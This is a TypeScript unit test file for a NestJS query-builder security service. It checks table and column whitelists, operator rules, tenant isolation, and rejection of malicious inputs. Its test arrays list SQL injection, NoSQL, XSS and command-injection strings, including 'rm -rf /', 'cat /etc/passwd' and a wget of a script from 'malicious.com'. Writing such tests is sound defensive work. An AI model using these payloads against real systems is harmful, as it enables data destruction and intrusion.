import { BadRequestException } from '@nestjs/common'
import { Test, type TestingModule } from '@nestjs/testing'
import { getDataSourceToken } from '@nestjs/typeorm'
import { vi } from 'vitest'
import { QueryBuilderSecurityService, QueryOperator } from '../query-builder-security.service'

describe('QueryBuilderSecurityService', () => {
  let service: QueryBuilderSecurityService

  const mockDataSource = {
    query: vi.fn(),
  }

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        QueryBuilderSecurityService,
        {
          provide: getDataSourceToken('tenant'),
          useValue: mockDataSource,
        },
      ],
    }).compile()

    service = module.get<QueryBuilderSecurityService>(QueryBuilderSecurityService)
  })

  afterEach(() => {
    vi.clearAllMocks()
  })

  describe('validateTable', () => {
    it('should validate allowed table', () => {
      expect(() => service.validateTable('clients')).not.toThrow()
    })

    it('should reject unauthorized table', () => {
      expect(() => service.validateTable('users')).toThrow(BadRequestException)
      expect(() => service.validateTable('passwords')).toThrow(BadRequestException)
      expect(() => service.validateTable('admin_secrets')).toThrow(BadRequestException)
    })

    it('should reject system tables', () => {
      expect(() => service.validateTable('information_schema')).toThrow(BadRequestException)
      expect(() => service.validateTable('pg_user')).toThrow(BadRequestException)
      expect(() => service.validateTable('mysql.user')).toThrow(BadRequestException)
    })

    it('should handle case insensitive table names', () => {
      expect(() => service.validateTable('CLIENTS')).not.toThrow()
      expect(() => service.validateTable('Clients')).not.toThrow()
    })

    it('should normalize and sanitize table names', () => {
      expect(() => service.validateTable('clients  ')).not.toThrow() // trailing spaces
      expect(() => service.validateTable('  clients')).not.toThrow() // leading spaces
    })
  })

  describe('validateColumn', () => {
    it('should validate allowed column for select', () => {
      expect(() => service.validateColumn('clients', 'nom', 'select')).not.toThrow()
      expect(() => service.validateColumn('clients', 'email', 'select')).not.toThrow()
    })

    it('should reject sensitive columns for unauthorized operations', () => {
      expect(() => service.validateColumn('clients', 'company_id', 'select')).toThrow(
        BadRequestException
      )
    })

    it('should validate operation-specific permissions', () => {
      // Test filter permissions
      expect(() => service.validateColumn('clients', 'nom', 'filter')).not.toThrow()
      expect(() => service.validateColumn('clients', 'email', 'filter')).not.toThrow()

      // Test sort permissions
      expect(() => service.validateColumn('clients', 'nom', 'sort')).not.toThrow()
      expect(() => service.validateColumn('clients', 'telephone', 'sort')).toThrow(
        BadRequestException
      )
    })

    it('should reject unauthorized columns', () => {
      expect(() => service.validateColumn('clients', 'password', 'select')).toThrow(
        BadRequestException
      )
      expect(() => service.validateColumn('clients', 'secret_key', 'filter')).toThrow(
        BadRequestException
      )
    })

    it('should handle case sensitivity correctly', () => {
      expect(() => service.validateColumn('clients', 'NOM', 'select')).not.toThrow()
      expect(() => service.validateColumn('CLIENTS', 'nom', 'select')).not.toThrow()
    })
  })

  describe('validateOperator', () => {
    it('should validate allowed operators for columns', () => {
      expect(service.validateOperator('clients', 'nom', '=')).toBe(QueryOperator.EQUALS)
      expect(service.validateOperator('clients', 'nom', 'LIKE')).toBe(QueryOperator.LIKE)
      expect(service.validateOperator('clients', 'email', 'EQUALS')).toBe(QueryOperator.EQUALS)
    })

    it('should reject unauthorized operators for columns', () => {
      expect(() => service.validateOperator('clients', 'nom', 'EXEC')).toThrow(BadRequestException)
      expect(() => service.validateOperator('clients', 'nom', 'DROP')).toThrow(BadRequestException)
    })

    it('should reject operators not allowed for specific columns', () => {
      // Assume 'telephone' column doesn't allow BETWEEN operator
      expect(() => service.validateOperator('clients', 'telephone', 'BETWEEN')).toThrow(
        BadRequestException
      )
    })

    it('should normalize operator case', () => {
      expect(service.validateOperator('clients', 'nom', 'like')).toBe(QueryOperator.LIKE)
      expect(service.validateOperator('clients', 'nom', 'Like')).toBe(QueryOperator.LIKE)
    })
  })

  describe('validateJoin', () => {
    it('should validate allowed joins', () => {
      expect(() => service.validateJoin('clients', 'addresses')).not.toThrow()
      expect(() => service.validateJoin('materiaux', 'categories')).not.toThrow()
    })

    it('should reject unauthorized joins', () => {
      expect(() => service.validateJoin('clients', 'users')).toThrow(BadRequestException)
      expect(() => service.validateJoin('materiaux', 'passwords')).toThrow(BadRequestException)
    })

    it('should reject joins from tables that do not allow joins', () => {
      // Assume some table doesn't allow joins
      const tableWithNoJoins = 'some_restricted_table'
      expect(() => service.validateJoin(tableWithNoJoins, 'clients')).toThrow(BadRequestException)
    })
  })

  describe('validateColumnValue', () => {
    it('should validate values against column patterns', () => {
      // Valid email
      expect(() =>
        service.validateColumnValue('clients', 'email', 'test@example.com')
      ).not.toThrow()

      // Valid phone
      expect(() =>
        service.validateColumnValue('clients', 'telephone', '+33123456789')
      ).not.toThrow()
    })

    it('should reject invalid values', () => {
      // Invalid email format
      expect(() => service.validateColumnValue('clients', 'email', 'invalid-email')).toThrow(
        BadRequestException
      )

      // Invalid phone format (with SQL injection attempt)
      expect(() =>
        service.validateColumnValue('clients', 'telephone', "'; DROP TABLE clients; --")
      ).toThrow(BadRequestException)
    })

    it('should handle injection attempts in values', () => {
      const maliciousValues = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        'UNION SELECT * FROM passwords',
        "<script>alert('xss')</script>",
        "' OR 1=1 OR '",
      ]

      maliciousValues.forEach((value) => {
        expect(() => service.validateColumnValue('clients', 'nom', value)).toThrow(
          BadRequestException
        )
      })
    })
  })

  describe('sanitizeIdentifier', () => {
    it('should sanitize valid identifiers', () => {
      expect(service.sanitizeIdentifier('clients')).toBe('clients')
      expect(service.sanitizeIdentifier('client_id')).toBe('client_id')
      expect(service.sanitizeIdentifier('CLIENT_NAME')).toBe('client_name')
    })

    it('should reject malicious identifiers', () => {
      const maliciousIdentifiers = [
        'clients; DROP TABLE users;',
        'clients/*comment*/',
        'clients--comment',
        "clients'or'1'='1",
        'clients UNION SELECT',
        'clients<script>',
        'clients";exec()',
      ]

      maliciousIdentifiers.forEach((identifier) => {
        expect(() => service.sanitizeIdentifier(identifier)).toThrow(BadRequestException)
      })
    })

    it('should handle quotes and special characters', () => {
      expect(() => service.sanitizeIdentifier('"clients"')).not.toThrow()
      expect(() => service.sanitizeIdentifier('`clients`')).not.toThrow()
      expect(() => service.sanitizeIdentifier("'clients'")).not.toThrow()
    })
  })

  describe('requiresTenantIsolation', () => {
    it('should correctly identify tenant tables', () => {
      expect(service.requiresTenantIsolation('clients')).toBe(true)
      expect(service.requiresTenantIsolation('fournisseurs')).toBe(true)
      expect(service.requiresTenantIsolation('materiaux')).toBe(true)
      expect(service.requiresTenantIsolation('commandes')).toBe(true)
    })

    it('should correctly identify non-tenant tables', () => {
      expect(service.requiresTenantIsolation('categories')).toBe(false)
    })
  })

  describe('getTenantColumn', () => {
    it('should return correct tenant column name', () => {
      expect(service.getTenantColumn('clients')).toBe('company_id')
      expect(service.getTenantColumn('fournisseurs')).toBe('company_id')
    })

    it('should return custom tenant column if specified', () => {
      // This would test custom tenant column configurations if they exist
      // For now, all tables use 'company_id'
      expect(service.getTenantColumn('clients')).toBe('company_id')
    })
  })

  describe('getMaxRows', () => {
    it('should return correct max rows for tables', () => {
      expect(service.getMaxRows('clients')).toBe(1000)
      expect(service.getMaxRows('fournisseurs')).toBe(500)
      expect(service.getMaxRows('materiaux')).toBe(2000)
    })

    it('should return undefined for tables without max rows limit', () => {
      expect(service.getMaxRows('categories')).toBe(100) // categories has a limit
    })
  })

  describe('getAllowedTables', () => {
    it('should return all whitelisted tables', () => {
      const tables = service.getAllowedTables()
      expect(tables).toHaveLength(5) // clients, fournisseurs, materiaux, commandes, categories
      expect(tables.map((t) => t.name)).toContain('clients')
      expect(tables.map((t) => t.name)).toContain('fournisseurs')
      expect(tables.map((t) => t.name)).toContain('materiaux')
      expect(tables.map((t) => t.name)).toContain('commandes')
      expect(tables.map((t) => t.name)).toContain('categories')
    })

    it('should not include unauthorized tables', () => {
      const tables = service.getAllowedTables()
      expect(tables.map((t) => t.name)).not.toContain('users')
      expect(tables.map((t) => t.name)).not.toContain('passwords')
      expect(tables.map((t) => t.name)).not.toContain('admin_secrets')
    })
  })

  describe('getAllowedColumns', () => {
    it('should return only allowed columns for select operations', () => {
      const columns = service.getAllowedColumns('clients')
      expect(columns).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ name: 'nom', allowSelect: true }),
          expect.objectContaining({ name: 'email', allowSelect: true }),
        ])
      )
      expect(columns).not.toEqual(
        expect.arrayContaining([expect.objectContaining({ name: 'company_id', allowSelect: true })])
      )
    })
  })

  describe('getSecurityStatistics', () => {
    it('should return comprehensive security statistics', () => {
      const stats = service.getSecurityStatistics()

      expect(stats).toHaveProperty('allowedTablesCount')
      expect(stats).toHaveProperty('totalColumnsCount')
      expect(stats).toHaveProperty('sensitiveColumnsCount')
      expect(stats).toHaveProperty('tenantIsolatedTablesCount')

      expect(typeof stats.allowedTablesCount).toBe('number')
      expect(typeof stats.totalColumnsCount).toBe('number')
      expect(typeof stats.sensitiveColumnsCount).toBe('number')
      expect(typeof stats.tenantIsolatedTablesCount).toBe('number')

      expect(stats.allowedTablesCount).toBeGreaterThan(0)
      expect(stats.totalColumnsCount).toBeGreaterThan(0)
      expect(stats.sensitiveColumnsCount).toBeGreaterThan(0)
      expect(stats.tenantIsolatedTablesCount).toBeGreaterThan(0)
    })
  })

  describe('SQL Injection Prevention Tests', () => {
    it('should prevent SQL injection in table names', () => {
      const sqlInjectionAttempts = [
        'clients; DROP TABLE users;',
        'clients UNION SELECT * FROM passwords',
        'clients/**/UNION/**/SELECT',
        "clients'/**/or/**/1=1",
        'clients; EXEC sp_configure',
        "clients'; INSERT INTO",
      ]

      sqlInjectionAttempts.forEach((attempt) => {
        expect(() => service.validateTable(attempt)).toThrow(BadRequestException)
      })
    })

    it('should prevent SQL injection in column names', () => {
      const sqlInjectionAttempts = [
        'nom; DROP TABLE users;',
        'nom UNION SELECT password',
        'nom/**/UNION/**/SELECT',
        "nom'/**/or/**/1=1",
        "nom'; DELETE FROM",
      ]

      sqlInjectionAttempts.forEach((attempt) => {
        expect(() => service.validateColumn('clients', attempt, 'select')).toThrow(
          BadRequestException
        )
      })
    })

    it('should prevent NoSQL injection attempts', () => {
      const nosqlInjectionAttempts = [
        '{ "$ne": null }',
        '{ "$regex": ".*" }',
        '{ "$where": "this.password" }',
        '{ "$eval": "db.users.find()" }',
      ]

      nosqlInjectionAttempts.forEach((attempt) => {
        expect(() => service.validateColumnValue('clients', 'nom', attempt)).toThrow(
          BadRequestException
        )
      })
    })

    it('should prevent XSS attempts in values', () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        'vbscript:msgbox(1)',
        'onload=alert(1)',
        '<img src=x onerror=alert(1)>',
      ]

      xssAttempts.forEach((attempt) => {
        expect(() => service.validateColumnValue('clients', 'nom', attempt)).toThrow(
          BadRequestException
        )
      })
    })

    it('should prevent command injection attempts', () => {
      const commandInjectionAttempts = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test || whoami',
        'test `id`',
        'test $(ls -la)',
        'test; wget malicious.com/script.sh',
      ]

      commandInjectionAttempts.forEach((attempt) => {
        expect(() => service.validateColumnValue('clients', 'nom', attempt)).toThrow(
          BadRequestException
        )
      })
    })
  })

  describe('Edge Cases and Boundary Tests', () => {
    it('should handle empty and null values correctly', () => {
      expect(() => service.validateTable('')).toThrow(BadRequestException)
      expect(() => service.validateColumn('clients', '', 'select')).toThrow(BadRequestException)
      expect(() => service.sanitizeIdentifier('')).toThrow(BadRequestException)
    })

    it('should handle very long inputs', () => {
      const longString = 'a'.repeat(1000)
      expect(() => service.validateTable(longString)).toThrow(BadRequestException)
      expect(() => service.validateColumn('clients', longString, 'select')).toThrow(
        BadRequestException
      )
    })

    it('should handle unicode and special encoding', () => {
      const unicodeAttempts = [
        'clients\u0000',
        'clients\x00',
        'clients\r\n',
        'clients\u202e', // Right-to-Left Override
        'clients\ufeff', // Byte Order Mark
      ]

      unicodeAttempts.forEach((attempt) => {
        expect(() => service.sanitizeIdentifier(attempt)).toThrow(BadRequestException)
      })
    })

    it('should handle SQL comments and whitespace', () => {
      const commentAttempts = [
        'clients --comment',
        'clients /*comment*/',
        'clients#comment',
        'clients\t\n\r',
        'clients\x20\x09\x0a\x0d', // Various whitespace chars
      ]

      commentAttempts.forEach((attempt) => {
        expect(() => service.sanitizeIdentifier(attempt)).toThrow(BadRequestException)
      })
    })
  })
})
